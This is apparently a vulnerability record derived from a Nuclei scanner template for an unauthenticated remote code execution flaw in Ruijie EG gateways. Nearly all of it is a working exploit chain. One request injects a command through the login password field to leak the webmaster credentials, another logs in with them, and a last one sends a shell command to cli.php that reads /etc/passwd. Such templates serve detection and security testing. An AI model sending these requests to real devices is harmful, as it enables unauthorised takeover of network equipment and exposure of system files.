# Vulnerability: Ruijie EG - Remote Code Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`ruijie-eg-rce.yaml`)

## Description
Ruikie EG's cli.php end point allows remote unauthenticated attackers to gain 'admin' privileges. The vulnerability is exploitable because an unauthenticated user can gain 'admin' privileges due to a vulnerability in the login screen.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin?show+webmaster+user

POST /login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin&password={{admin}}

POST /cli.php?a=shell HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

notdelay=true&command=cat /etc/passwd
```

